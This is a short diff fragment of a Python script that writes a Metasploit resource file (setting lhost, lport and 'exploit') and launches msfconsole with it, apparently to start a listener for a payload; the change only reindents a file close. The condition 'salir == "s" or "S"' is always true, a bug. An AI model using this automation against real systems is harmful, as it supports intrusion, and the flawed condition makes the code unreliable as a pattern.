@@ -97,7 +97,7 @@ while True:
                     f.write("set lhost 0.0.0.0\n")
                     f.write("set lport {}\n".format(lport))
                     f.write("exploit")
-               f.close()
+                    f.close()
             if salir == "s" or "S":
                 os.system("msfconsole -r meta.rc")
             else:
